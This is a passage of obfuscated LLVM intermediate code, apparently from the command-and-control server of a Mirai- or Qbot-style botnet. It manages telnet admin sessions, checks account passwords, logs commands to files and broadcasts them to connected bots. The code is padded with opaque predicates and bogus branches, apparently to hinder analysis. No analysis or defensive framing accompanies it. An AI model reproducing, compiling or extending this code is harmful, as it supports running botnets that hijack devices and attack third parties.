  %1769 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1770 = call i64 @strlen(i8* %1769) #8
  %1771 = call i64 @send(i32 %1767, i8* %1768, i64 %1770, i32 16384)
  %1772 = icmp eq i64 %1771, -1
  %1773 = load i32, i32* @x.23
  %1774 = load i32, i32* @y.24
  %1775 = sub i32 %1773, 1
  %1776 = mul i32 %1773, %1775
  %1777 = urem i32 %1776, 2
  %1778 = icmp eq i32 %1777, 0
  %1779 = icmp slt i32 %1774, 10
  %1780 = or i1 %1778, %1779
  br i1 %1780, label %originalBBpart2245, label %originalBB243alteredBB

originalBBpart2245:                               ; preds = %originalBB243
  br i1 %1772, label %1781, label %1782

; <label>:1781:                                   ; preds = %originalBBpart2245
  store i8* null, i8** %2, align 8
  br label %1929

; <label>:1782:                                   ; preds = %originalBBpart2245
  %1783 = load i32, i32* @x.23
  %1784 = load i32, i32* @y.24
  %1785 = sub i32 %1783, 1
  %1786 = mul i32 %1783, %1785
  %1787 = urem i32 %1786, 2
  %1788 = icmp eq i32 %1787, 0
  %1789 = icmp slt i32 %1784, 10
  %1790 = or i1 %1788, %1789
  br i1 %1790, label %originalBB247, label %originalBB247alteredBB

originalBB247:                                    ; preds = %originalBB247alteredBB, %1782
  %1791 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %1791, %struct._IO_FILE** %43, align 8
  %1792 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %1793 = load i32, i32* %5, align 4
  %1794 = sext i32 %1793 to i64
  %1795 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1794
  %1796 = getelementptr inbounds %struct.account, %struct.account* %1795, i32 0, i32 0
  %1797 = getelementptr inbounds [200 x i8], [200 x i8]* %1796, i32 0, i32 0
  %1798 = load i8*, i8** %41, align 8
  %1799 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1792, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i32 0, i32 0), i8* %1797, i8* %1798)
  %1800 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %1801 = call i32 @fclose(%struct._IO_FILE* %1800)
  %1802 = load i32, i32* @x.23
  %1803 = load i32, i32* @y.24
  %1804 = sub i32 %1802, 1
  %1805 = mul i32 %1802, %1804
  %1806 = urem i32 %1805, 2
  %1807 = icmp eq i32 %1806, 0
  %1808 = icmp slt i32 %1803, 10
  %1809 = or i1 %1807, %1808
  br i1 %1809, label %originalBBpart2249, label %originalBB247alteredBB

originalBBpart2249:                               ; preds = %originalBB247
  br label %1837

; <label>:1810:                                   ; preds = %1730
  %1811 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1812 = call i32 (i8*, i8*, ...) @sprintf(i8* %1811, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %1813 = load i32, i32* %4, align 4
  %1814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1816 = call i64 @strlen(i8* %1815) #8
  %1817 = call i64 @send(i32 %1813, i8* %1814, i64 %1816, i32 16384)
  %1818 = icmp eq i64 %1817, -1
  br i1 %1818, label %1819, label %1820

; <label>:1819:                                   ; preds = %1810
  br label %1820

; <label>:1820:                                   ; preds = %1819, %1810
  %1821 = load i32, i32* @x.23
  %1822 = load i32, i32* @y.24
  %1823 = sub i32 %1821, 1
  %1824 = mul i32 %1821, %1823
  %1825 = urem i32 %1824, 2
  %1826 = icmp eq i32 %1825, 0
  %1827 = icmp slt i32 %1822, 10
  %1828 = or i1 %1826, %1827
  br i1 %1828, label %originalBB251, label %originalBB251alteredBB

originalBB251:                                    ; preds = %originalBB251alteredBB, %1820
  %1829 = load i32, i32* @x.23
  %1830 = load i32, i32* @y.24
  %1831 = sub i32 %1829, 1
  %1832 = mul i32 %1829, %1831
  %1833 = urem i32 %1832, 2
  %1834 = icmp eq i32 %1833, 0
  %1835 = icmp slt i32 %1830, 10
  %1836 = or i1 %1834, %1835
  br i1 %1836, label %originalBBpart2253, label %originalBB251alteredBB

originalBBpart2253:                               ; preds = %originalBB251
  br label %1837

; <label>:1837:                                   ; preds = %originalBBpart2253, %originalBBpart2249
  %1838 = load i32, i32* @x.23
  %1839 = load i32, i32* @y.24
  %1840 = sub i32 %1838, 1
  %1841 = mul i32 %1838, %1840
  %1842 = urem i32 %1841, 2
  %1843 = icmp eq i32 %1842, 0
  %1844 = icmp slt i32 %1839, 10
  %1845 = or i1 %1843, %1844
  br i1 %1845, label %originalBB255, label %originalBB255alteredBB

originalBB255:                                    ; preds = %originalBB255alteredBB, %1837
  %1846 = load i32, i32* @x.23
  %1847 = load i32, i32* @y.24
  %1848 = sub i32 %1846, 1
  %1849 = mul i32 %1846, %1848
  %1850 = urem i32 %1849, 2
  %1851 = icmp eq i32 %1850, 0
  %1852 = icmp slt i32 %1847, 10
  %1853 = or i1 %1851, %1852
  br i1 %1853, label %originalBBpart2257, label %originalBB255alteredBB

originalBBpart2257:                               ; preds = %originalBB255
  br label %1854

; <label>:1854:                                   ; preds = %originalBBpart2257, %1717
  %1855 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1856 = call i8* @strstr(i8* %1855, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i32 0, i32 0)) #8
  %1857 = icmp ne i8* %1856, null
  br i1 %1857, label %1858, label %1859

; <label>:1858:                                   ; preds = %1854
  br label %1920

; <label>:1859:                                   ; preds = %1854
  %1860 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %1860)
  %1861 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1862 = load i32, i32* %5, align 4
  %1863 = sext i32 %1862 to i64
  %1864 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1863
  %1865 = getelementptr inbounds %struct.account, %struct.account* %1864, i32 0, i32 0
  %1866 = getelementptr inbounds [200 x i8], [200 x i8]* %1865, i32 0, i32 0
  %1867 = call i32 (i8*, i8*, ...) @sprintf(i8* %1861, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i32 0, i32 0), i8* %1866) #7
  %1868 = load i32, i32* %4, align 4
  %1869 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1870 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %1871 = call i64 @strlen(i8* %1870) #8
  %1872 = call i64 @send(i32 %1868, i8* %1869, i64 %1871, i32 16384)
  %1873 = icmp eq i64 %1872, -1
  br i1 %1873, label %1874, label %1875

; <label>:1874:                                   ; preds = %1859
  br label %1920

; <label>:1875:                                   ; preds = %1859
  %1876 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1877 = call i64 @strlen(i8* %1876) #8
  %1878 = icmp eq i64 %1877, 0
  br i1 %1878, label %1879, label %1896

; <label>:1879:                                   ; preds = %1875
  %1880 = load i32, i32* @x.23
  %1881 = load i32, i32* @y.24
  %1882 = sub i32 %1880, 1
  %1883 = mul i32 %1880, %1882
  %1884 = urem i32 %1883, 2
  %1885 = icmp eq i32 %1884, 0
  %1886 = icmp slt i32 %1881, 10
  %1887 = or i1 %1885, %1886
  br i1 %1887, label %originalBB259, label %originalBB259alteredBB

originalBB259:                                    ; preds = %originalBB259alteredBB, %1879
  %1888 = load i32, i32* @x.23
  %1889 = load i32, i32* @y.24
  %1890 = sub i32 %1888, 1
  %1891 = mul i32 %1888, %1890
  %1892 = urem i32 %1891, 2
  %1893 = icmp eq i32 %1892, 0
  %1894 = icmp slt i32 %1889, 10
  %1895 = or i1 %1893, %1894
  br i1 %1895, label %originalBBpart2261, label %originalBB259alteredBB

originalBBpart2261:                               ; preds = %originalBB259
  br label %336

; <label>:1896:                                   ; preds = %1875
  %1897 = load i32, i32* %5, align 4
  %1898 = sext i32 %1897 to i64
  %1899 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1898
  %1900 = getelementptr inbounds %struct.account, %struct.account* %1899, i32 0, i32 0
  %1901 = getelementptr inbounds [200 x i8], [200 x i8]* %1900, i32 0, i32 0
  %1902 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1903 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %1901, i8* %1902)
  %1904 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %1904, %struct._IO_FILE** %44, align 8
  %1905 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %1906 = load i32, i32* %5, align 4
  %1907 = sext i32 %1906 to i64
  %1908 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1907
  %1909 = getelementptr inbounds %struct.account, %struct.account* %1908, i32 0, i32 0
  %1910 = getelementptr inbounds [200 x i8], [200 x i8]* %1909, i32 0, i32 0
  %1911 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1912 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1905, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %1910, i8* %1911)
  %1913 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %1914 = call i32 @fclose(%struct._IO_FILE* %1913)
  %1915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1916 = load i32, i32* %4, align 4
  %1917 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i32 0, i32 0
  call void @broadcast(i8* %1915, i32 %1916, i8* %1917)
  %1918 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1918, i8 0, i64 2048, i32 16, i1 false)
  br label %336

; <label>:1919:                                   ; preds = %originalBBpart244
  br label %1920

; <label>:1920:                                   ; preds = %1919, %1874, %1858, %originalBBpart2158, %1093, %originalBBpart270, %462, %317, %302, %291, %290, %239, %233, %199, %originalBBpart228, %135, %128
  %1921 = load i32, i32* %4, align 4
  %1922 = sext i32 %1921 to i64
  %1923 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1922
  %1924 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1923, i32 0, i32 1
  store i32 0, i32* %1924, align 4
  %1925 = load i32, i32* %4, align 4
  %1926 = call i32 @close(i32 %1925)
  %1927 = load volatile i32, i32* @managesConnected, align 4
  %1928 = add nsw i32 %1927, -1
  store volatile i32 %1928, i32* @managesConnected, align 4
  br label %1929

; <label>:1929:                                   ; preds = %1920, %1781, %1669, %originalBBpart2233, %1583, %originalBBpart2225, %originalBBpart2178, %originalBBpart2170
  %1930 = load i8*, i8** %2, align 8
  ret i8* %1930

originalBBalteredBB:                              ; preds = %originalBB, %54
  %1931 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %1932 = call i32 @feof(%struct._IO_FILE* %1931) #7
  %1933 = icmp ne i32 %1932, 0
  %_ = sub i1 %1933, true
  %gen = mul i1 %_, true
  %_1 = sub i1 false, %1933
  %gen2 = add i1 %_1, true
  %_3 = sub i1 false, %1933
  %gen4 = add i1 %_3, true
  %_5 = sub i1 %1933, true
  %gen6 = mul i1 %_5, true
  %_7 = sub i1 false, %1933
  %gen8 = add i1 %_7, true
  %1934 = xor i1 %1933, true
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %87
  %1935 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %1936 = load i32, i32* %21, align 4
  %1937 = sext i32 %1936 to i64
  %1938 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1937
  %1939 = getelementptr inbounds %struct.account, %struct.account* %1938, i32 0, i32 0
  %1940 = getelementptr inbounds [200 x i8], [200 x i8]* %1939, i32 0, i32 0
  %1941 = load i32, i32* %21, align 4
  %1942 = sext i32 %1941 to i64
  %1943 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1942
  %1944 = getelementptr inbounds %struct.account, %struct.account* %1943, i32 0, i32 1
  %1945 = getelementptr inbounds [200 x i8], [200 x i8]* %1944, i32 0, i32 0
  %1946 = load i32, i32* %21, align 4
  %1947 = sext i32 %1946 to i64
  %1948 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1947
  %1949 = getelementptr inbounds %struct.account, %struct.account* %1948, i32 0, i32 2
  %1950 = getelementptr inbounds [200 x i8], [200 x i8]* %1949, i32 0, i32 0
  %1951 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %1935, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* %1940, i8* %1945, i8* %1950)
  %1952 = load i32, i32* %21, align 4
  %_10 = shl i32 %1952, 1
  %_11 = sub i32 0, %1952
  %gen12 = add i32 %_11, 1
  %_13 = shl i32 %1952, 1
  %_14 = shl i32 %1952, 1
  %_15 = sub i32 %1952, 1
  %gen16 = mul i32 %_15, 1
  %_17 = shl i32 %1952, 1
  %_18 = shl i32 %1952, 1
  %1953 = add nsw i32 %1952, 1
  store i32 %1953, i32* %21, align 4
  br label %originalBB9

originalBB22alteredBB:                            ; preds = %originalBB22, %136
  %1954 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1955 = call i32 (i8*, i8*, ...) @sprintf(i8* %1954, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i32 0, i32 0)) #7
  %1956 = load i32, i32* %4, align 4
  %1957 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1959 = call i64 @strlen(i8* %1958) #8
  %1960 = call i64 @send(i32 %1956, i8* %1957, i64 %1959, i32 16384)
  %1961 = icmp eq i64 %1960, -1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %161
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %178
  %1962 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1963 = load i32, i32* %4, align 4
  %1964 = call i32 @fdgets(i8* %1962, i32 2048, i32 %1963)
  %1965 = icmp slt i32 %1964, 1
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %240
  %1966 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @trim(i8* %1966)
  %1967 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1968 = load i32, i32* %5, align 4
  %1969 = sext i32 %1968 to i64
  %1970 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1969
  %1971 = getelementptr inbounds %struct.account, %struct.account* %1970, i32 0, i32 1
  %1972 = getelementptr inbounds [200 x i8], [200 x i8]* %1971, i32 0, i32 0
  %1973 = call i32 @strcmp(i8* %1967, i8* %1972) #8
  %1974 = icmp ne i32 %1973, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %266
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %336
  %1975 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1976 = load i32, i32* %4, align 4
  %1977 = call i32 @fdgets(i8* %1975, i32 2048, i32 %1976)
  %1978 = icmp sgt i32 %1977, 0
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %357
  %1979 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1980 = call i8* @strstr(i8* %1979, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0)) #8
  %1981 = icmp ne i8* %1980, null
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %377
  %1982 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1983 = call i8* @strstr(i8* %1982, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i32 0, i32 0)) #8
  %1984 = icmp ne i8* %1983, null
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %397
  %1985 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1986 = call i8* @strstr(i8* %1985, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i32 0, i32 0)) #8
  %1987 = icmp ne i8* %1986, null
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %465
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %482
  %1988 = load i32, i32* %25, align 4
  %_63 = sub i32 0, %1988
  %gen64 = add i32 %_63, 1
  %1989 = add nsw i32 %1988, 1
  store i32 %1989, i32* %25, align 4
  br label %originalBB62

originalBB68alteredBB:                            ; preds = %originalBB68, %511
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %528
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %545
  %1990 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1991 = call i8* @strstr(i8* %1990, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0)) #8
  %1992 = icmp ne i8* %1991, null
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %607
  %1993 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1994 = call i32 (i8*, i8*, ...) @sprintf(i8* %1993, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i32 0, i32 0)) #7
  %1995 = load i32, i32* %4, align 4
  %1996 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1997 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1998 = call i64 @strlen(i8* %1997) #8
  %1999 = call i64 @send(i32 %1995, i8* %1996, i64 %1998, i32 16384)
  %2000 = icmp eq i64 %1999, -1
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %632
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %669
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %686
  %2001 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2002 = call i8* @strstr(i8* %2001, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0)) #8
  %2003 = icmp ne i8* %2002, null
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %715
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %732
  %2004 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2005 = call i32 (i8*, i8*, ...) @sprintf(i8* %2004, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i32 0, i32 0)) #7
  %2006 = load i32, i32* %4, align 4
  %2007 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2008 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2009 = call i64 @strlen(i8* %2008) #8
  %2010 = call i64 @send(i32 %2006, i8* %2007, i64 %2009, i32 16384)
  %2011 = icmp eq i64 %2010, -1
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %758
  %2012 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2013 = call i32 (i8*, i8*, ...) @sprintf(i8* %2012, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i32 0, i32 0)) #7
  %2014 = load i32, i32* %4, align 4
  %2015 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2016 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2017 = call i64 @strlen(i8* %2016) #8
  %2018 = call i64 @send(i32 %2014, i8* %2015, i64 %2017, i32 16384)
  %2019 = icmp eq i64 %2018, -1
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %785
  %2020 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2021 = call i8* @strstr(i8* %2020, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i32 0, i32 0)) #8
  %2022 = icmp ne i8* %2021, null
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %805
  %2023 = load i8*, i8** %12, align 8
  %2024 = load i32, i32* %5, align 4
  %2025 = sext i32 %2024 to i64
  %2026 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2025
  %2027 = getelementptr inbounds %struct.account, %struct.account* %2026, i32 0, i32 2
  %2028 = getelementptr inbounds [200 x i8], [200 x i8]* %2027, i32 0, i32 0
  %2029 = call i32 @strcmp(i8* %2023, i8* %2028) #8
  %2030 = icmp eq i32 %2029, 0
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %879
  %2031 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2032 = call i32 (i8*, i8*, ...) @sprintf(i8* %2031, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i32 0, i32 0)) #7
  %2033 = load i32, i32* %4, align 4
  %2034 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2035 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2036 = call i64 @strlen(i8* %2035) #8
  %2037 = call i64 @send(i32 %2033, i8* %2034, i64 %2036, i32 16384)
  %2038 = icmp eq i64 %2037, -1
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %906
  %2039 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2040 = call i32 (i8*, i8*, ...) @sprintf(i8* %2039, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %2041 = load i32, i32* %4, align 4
  %2042 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2043 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2044 = call i64 @strlen(i8* %2043) #8
  %2045 = call i64 @send(i32 %2041, i8* %2042, i64 %2044, i32 16384)
  %2046 = icmp eq i64 %2045, -1
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %933
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %973
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %990
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1007
  %2047 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2048 = call i8* @strstr(i8* %2047, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #8
  %2049 = icmp ne i8* %2048, null
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1027
  %2050 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2051 = call i8* @strstr(i8* %2050, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0)) #8
  %2052 = icmp ne i8* %2051, null
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %1047
  %2053 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2054 = call i32 (i8*, i8*, ...) @sprintf(i8* %2053, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #7
  %2055 = load i32, i32* %4, align 4
  %2056 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2057 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2058 = call i64 @strlen(i8* %2057) #8
  %2059 = call i64 @send(i32 %2055, i8* %2056, i64 %2058, i32 16384)
  %2060 = icmp eq i64 %2059, -1
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1072
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %1136
  %2061 = load i32, i32* %4, align 4
  %2062 = call i64 @send(i32 %2061, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 16, i32 16384)
  %2063 = icmp eq i64 %2062, -1
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1156
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1174
  %2064 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2065 = call i8* @strstr(i8* %2064, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0)) #8
  %2066 = icmp ne i8* %2065, null
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %1194
  %2067 = load i8*, i8** %12, align 8
  %2068 = load i32, i32* %5, align 4
  %2069 = sext i32 %2068 to i64
  %2070 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2069
  %2071 = getelementptr inbounds %struct.account, %struct.account* %2070, i32 0, i32 2
  %2072 = getelementptr inbounds [200 x i8], [200 x i8]* %2071, i32 0, i32 0
  %2073 = call i32 @strcmp(i8* %2067, i8* %2072) #8
  %2074 = icmp eq i32 %2073, 0
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %1237
  store i8* null, i8** %2, align 8
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %1254
  store i32 0, i32* %34, align 4
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %1304
  store i8* null, i8** %2, align 8
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %1321
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1338
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1355
  %2075 = load i32, i32* %34, align 4
  %_189 = sub i32 %2075, 1
  %gen190 = mul i32 %_189, 1
  %_191 = sub i32 %2075, 1
  %gen192 = mul i32 %_191, 1
  %_193 = sub i32 %2075, 1
  %gen194 = mul i32 %_193, 1
  %_195 = shl i32 %2075, 1
  %2076 = add nsw i32 %2075, 1
  store i32 %2076, i32* %34, align 4
  br label %originalBB188

originalBB199alteredBB:                           ; preds = %originalBB199, %1375
  %2077 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2078 = call i32 (i8*, i8*, ...) @sprintf(i8* %2077, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %2079 = load i32, i32* %4, align 4
  %2080 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2081 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2082 = call i64 @strlen(i8* %2081) #8
  %2083 = call i64 @send(i32 %2079, i8* %2080, i64 %2082, i32 16384)
  %2084 = icmp eq i64 %2083, -1
  br label %originalBB199

originalBB203alteredBB:                           ; preds = %originalBB203, %1401
  br label %originalBB203

originalBB207alteredBB:                           ; preds = %originalBB207, %1419
  %2085 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %2086 = call i8* @strstr(i8* %2085, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #8
  %2087 = icmp ne i8* %2086, null
  br label %originalBB207

originalBB211alteredBB:                           ; preds = %originalBB211, %1448
  %2088 = load i8*, i8** %13, align 8
  %2089 = load i32, i32* %5, align 4
  %2090 = sext i32 %2089 to i64
  %2091 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %2090
  %2092 = getelementptr inbounds %struct.account, %struct.account* %2091, i32 0, i32 2
  %2093 = getelementptr inbounds [200 x i8], [200 x i8]* %2092, i32 0, i32 0
  %2094 = call i32 @strcmp(i8* %2088, i8* %2093) #8
  %2095 = icmp eq i32 %2094, 0
  br label %originalBB211

originalBB215alteredBB:                           ; preds = %originalBB215, %1495
  %2096 = load i32, i32* %35, align 4
  %2097 = sext i32 %2096 to i64
  %2098 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2097
  %2099 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2098, i32 0, i32 2
  %2100 = getelementptr inbounds [20 x i8], [20 x i8]* %2099, i32 0, i32 0
  %2101 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i32 0, i32 0
  %2102 = call i8* @strstr(i8* %2100, i8* %2101) #8
  %2103 = icmp ne i8* %2102, null
  br label %originalBB215

originalBB219alteredBB:                           ; preds = %originalBB219, %1520
  %2104 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %2105 = load i32, i32* %4, align 4
